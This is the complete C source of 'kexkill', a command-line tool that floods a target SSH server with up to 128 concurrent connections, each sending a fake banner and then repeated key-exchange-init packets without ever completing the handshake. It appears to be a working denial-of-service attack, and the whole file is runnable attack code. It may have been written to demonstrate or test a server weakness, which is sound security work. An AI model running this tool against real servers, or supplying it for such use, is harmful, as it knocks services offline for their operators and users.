/*-
 * Copyright (c) 2016 The University of Oslo
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>

#include <err.h>
#include <errno.h>
#include <netdb.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAXCONCUR	 128

static struct kk_conn {
	int	 fd;
	enum kk_state {
		kk_closed = 0,
		kk_connected,
		kk_banner,
		kk_kexinit,
	} state;
	size_t	 buflen;
	char	 buf[2048];
} conns[MAXCONCUR];

static char banner[] = "SSH-2.0-kexkill\r\n";
static char kexinit[] =
    "\x00\x00\x00\xcc"			/* packet length */
    "\x08"				/* padding length */
    "\x14"				/* SSH_MSG_KEXINIT */
    "give me cookies!"			/* cookie */
    "\x00\x00\x00\x36"			/* key exchange */
    "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1"
    "\x00\x00\x00\x0f"			/* server host key */
    "ssh-dss,ssh-rsa"
    "\x00\x00\x00\x13"			/* ctos encryption */
    "3des-cbc,aes128-cbc"
    "\x00\x00\x00\x13"			/* stoc encryption */
    "3des-cbc,aes128-cbc"
    "\x00\x00\x00\x09"			/* ctos authentication */
    "hmac-sha1"
    "\x00\x00\x00\x09"			/* stoc authentication */
    "hmac-sha1"
    "\x00\x00\x00\x04"			/* ctos compression */
    "none"
    "\x00\x00\x00\x04"			/* stoc compression */
    "none"
    "\x00\x00\x00\x00"			/* ctos languages */
    "\x00\x00\x00\x00"			/* stoc languages */
    "\x00"				/* KEX follows */
    "\x00\x00\x00\x00"			/* future extension */
    "padding!"				/* padding */
    "";

static int verbose;

static int
kk_connect(struct kk_conn *conn, struct sockaddr *sa, socklen_t salen)
{
	int fd;

	if (verbose > 1)
		warnx("%s()", __func__);
	if ((fd = socket(sa->sa_family, SOCK_STREAM, 0)) == -1) {
		warn("socket()");
		goto fail;
	}
	if (connect(fd, sa, salen) != 0) {
		warn("connect()");
		goto fail;
	}
	if (verbose)
		warnx("[%02x] connected", fd);
	conn->fd = fd;
	conn->state = kk_connected;
	return (0);
fail:
	close(fd);
	return (-1);
}

static void
kk_close(struct kk_conn *conn)
{

	if (verbose > 1)
		warnx("[%02x] %s()", conn->fd, __func__);
	close(conn->fd);
	memset(conn, 0, sizeof *conn);
	conn->fd = -1;
	conn->state = kk_closed;
}

static int
kk_write(struct kk_conn *conn, const void *data, size_t len)
{
	ssize_t wlen;

	if (verbose > 1)
		warnx("[%02x] %s(%zu)", conn->fd, __func__, len);
	while (len > 0) {
		if ((wlen = write(conn->fd, data, len)) < 0) {
			warn("[%02x] write()", conn->fd);
			return (-1);
		}
		if (verbose > 1)
			warnx("[%02x] wrote %zu bytes", conn->fd, len);
		data = (const char *)data + wlen;
		len -= wlen;
	}
	return (0);
}

static int
kk_input(struct kk_conn *conn)
{
	char *eom, *eop;
	ssize_t rlen;
	size_t len;

	if (verbose > 1)
		warnx("[%02x] %s()", conn->fd, __func__);
	if (conn->buflen == sizeof conn->buf) {
		warnx("[%02x] buffer full", conn->fd);
		goto fail;
	}
	len = sizeof conn->buf - conn->buflen;
	if ((rlen = read(conn->fd, conn->buf, len)) < 0) {
		warn("[%02x] read()", conn->fd);
		goto fail;
	}
	conn->buflen += rlen;
	eom = conn->buf + conn->buflen;
	switch (conn->state) {
	case kk_connected:
		/* search for CR */
		for (eop = conn->buf; eop < eom; ++eop)
			if (*eop == '\r')
				break;
		/* wait for LF if not present */
		if (eop >= eom - 1)
			return (0);
		/* terminate at CR, check for LF, check length, check banner */
		*eop++ = '\0';
		if (*eop++ != '\n' || eop - conn->buf > 255 ||
		    strncmp(conn->buf, "SSH-2.0-", 8) != 0) {
			warnx("[%02x] invalid banner", conn->fd);
			goto fail;
		}
		/* we're ready to send our own banner */
		if (verbose)
			warnx("[%02x] got banner: %s", conn->fd, conn->buf);
		memmove(conn->buf, eop, eom - eop);
		conn->buflen -= eop - conn->buf;
		conn->state = kk_banner;
		break;
	case kk_kexinit:
		if (conn->buflen < 4)
			break;
		len =
		    (uint8_t)conn->buf[0] << 24 |
		    (uint8_t)conn->buf[1] << 16 |
		    (uint8_t)conn->buf[2] << 8  |
		    (uint8_t)conn->buf[3];
		if (len + 4 > sizeof conn->buf) {
			warnx("[%02x] oversize packet (%zu bytes)", conn->fd, len);
			goto fail;
		}
		eop = conn->buf + len + 4;
		if (eop > eom)
			break;
		if (verbose > 1)
			warnx("[%02x] received type %u packet (%zu bytes)",
			    conn->fd, (unsigned int)conn->buf[5], len);
		if (conn->buf[5] == 1) {
			if (verbose)
				warnx("[%02x] received disconnect", conn->fd);
			kk_close(conn);
			return (0);
		} else if (conn->buf[5] == 20) {
			if (verbose)
				warnx("[%02x] received kexinit", conn->fd);
		}
		memmove(conn->buf, eop, eom - eop);
		conn->buflen -= eop - conn->buf;
		
		break;
	default:
		;
	}
	return (0);
fail:
	kk_close(conn);
	return (-1);
}

static int
kk_output(struct kk_conn *conn)
{

	if (verbose > 1)
		warnx("[%02x] %s()", conn->fd, __func__);
	switch (conn->state) {
	case kk_banner:
		if (verbose)
			warnx("[%02x] sending banner", conn->fd);
		if (kk_write(conn, banner, sizeof banner - 1) != 0)
			goto fail;
		conn->state = kk_kexinit;
		break;
	case kk_kexinit:
		if (verbose)
			warnx("[%02x] sending kexinit", conn->fd);
		if (kk_write(conn, kexinit, sizeof kexinit - 1) != 0)
			goto fail;
		break;
	default:
		;
	}
	return (0);
fail:
	kk_close(conn);
	return (-1);
}

static int
kexkill(struct sockaddr *sa, socklen_t salen)
{
	struct pollfd pfd[MAXCONCUR];
	int i, k, n, ret;

	k = 0;
	for (;;) {
		memset(&pfd, 0, sizeof pfd);
		for (i = n = 0; i < MAXCONCUR; ++i) {
			if (conns[i].state == kk_closed) {
				if (kk_connect(&conns[i], sa, salen) == 0)
					k++;
			}
			pfd[i].fd = conns[i].fd;
			if (conns[i].state == kk_closed) {
				pfd[i].events = POLLNVAL;
			} else {
				pfd[i].events = POLLIN | POLLOUT | POLLERR;
				n = i + 1;
			}
		}
		if (n == 0)
			break;
		if (verbose > 1)
			warnx("polling %d/%d connections", n, k);
		// usleep(1000000);
		if ((ret = poll(pfd, MAXCONCUR, -1)) < 0 && errno != EINTR)
			err(1, "poll()");
		if (ret <= 0)
			continue;
		if (verbose > 1)
			warnx("polled %d events", ret);
		for (i = 0; i < MAXCONCUR; ++i) {
			if (pfd[i].fd == 0)
				continue;
			if (pfd[i].revents & (POLLERR|POLLHUP)) {
				if (verbose)
					warnx("[%02x] connection closed", pfd[i].fd);
				kk_close(&conns[i]);
				continue;
			}
			if (pfd[i].revents & POLLIN)
				kk_input(&conns[i]);
			if (pfd[i].revents & POLLOUT)
				kk_output(&conns[i]);
		}
	}
	return (k);
}

static void
usage(void)
{

	fprintf(stderr, "usage: kexkill [-v] host[:port]\n");
	exit(1);
}

int
main(int argc, char *argv[])
{
	struct addrinfo *res, *reslist, hints;
	char *host, *service;
	int i, eai, opt;

	while ((opt = getopt(argc, argv, "v")) != -1)
		switch (opt) {
		case 'v':
			verbose++;
			break;
		default:
			usage();
		}

	argc -= optind;
	argv += optind;

	if (argc != 1)
		usage();

	host = argv[0];
	if ((service = strchr(host, ':')) != NULL)
		*service++ = '\0';
	else
		service = (char *)(uintptr_t)"ssh";

	memset(&conns, 0, sizeof conns);
	for (i = 0; i < MAXCONCUR; ++i)
		conns[i].fd = -1;

	memset(&hints, 0, sizeof hints);
	hints.ai_socktype = SOCK_STREAM;
	if ((eai = getaddrinfo(host, service, &hints, &reslist)) != 0)
		errx(1, "getaddrinfo(): %s", gai_strerror(eai));
	for (res = reslist; res; res = res->ai_next)
		if (kexkill(res->ai_addr, res->ai_addrlen) > 0)
			break;
	freeaddrinfo(reslist);

	exit(0);
}